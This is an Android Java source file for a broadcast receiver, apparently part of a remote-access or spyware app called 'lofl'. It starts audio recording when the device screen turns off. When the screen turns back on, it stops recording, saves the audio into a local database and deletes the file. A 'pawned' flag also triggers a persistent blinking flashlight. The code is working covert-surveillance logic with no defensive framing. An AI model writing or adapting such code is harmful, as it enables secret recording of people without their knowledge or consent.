package com.candroid.lofl.receivers;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.os.Process;
import android.util.Log;

import com.candroid.lofl.api.Systems;
import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;
import com.candroid.lofl.services.LoflService;

import java.io.File;

public class ScreenReceiver extends BroadcastReceiver {
    public static final String TAG = ScreenReceiver.class.getSimpleName();
    public static final String RECORDER_KEY = "RECORDER_KEY";
    public static boolean sIsPawned = false;
    protected static boolean sKill = false;
    public static boolean sShouldRecordAudio = false;
    private static boolean isTaskScheduled = false;
    @Override
    public void onReceive(final Context context, final Intent intent) {
        if(intent.getAction().equals(Intent.ACTION_SCREEN_ON)){
            if(context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED){
                if(LoflService.sRecorder != null) {
                    final PendingResult result = goAsync();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            File file = LoflService.sRecorder.getFile();
                            if (file != null) {
                                SQLiteDatabase db = DatabaseHelper.getInstance(context).getWritableDatabase();
                                try {
                                    db.beginTransaction();
                                    Database.insertMedia(db, file.getName(), file);
                                    db.setTransactionSuccessful();
                                } catch (SQLException e) {
                                    e.printStackTrace();
                                } finally {
                                    db.endTransaction();
                                    db.close();
                                    boolean filedDeleted = file.delete();
                                    if (filedDeleted) {
                                        Log.d(TAG, "audio file deleted");
                                    }
                                }
                            }
                            LoflService.stopRecording();
                            LoflService.sRecorder = null;
                            result.finish();
                        }
                    }).start();
                }
            }

            /*if(!isTaskScheduled){
                if(Lofl.isPawned(context)){
                    isTaskScheduled = true;
                    Lofl.persistentBlinkingFlashlight(context);
                }
            }*/
            if(!isTaskScheduled && sIsPawned){
                if(context.checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    Systems.Camera.persistentBlinkingFlashlight(context);
                }
            }
        }else if(intent.getAction().equals(Intent.ACTION_SCREEN_OFF)){
            sKill = true;
            if(context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                if(sShouldRecordAudio){
                    LoflService.recordAudio(context);
                }
            }
        }
    }
}
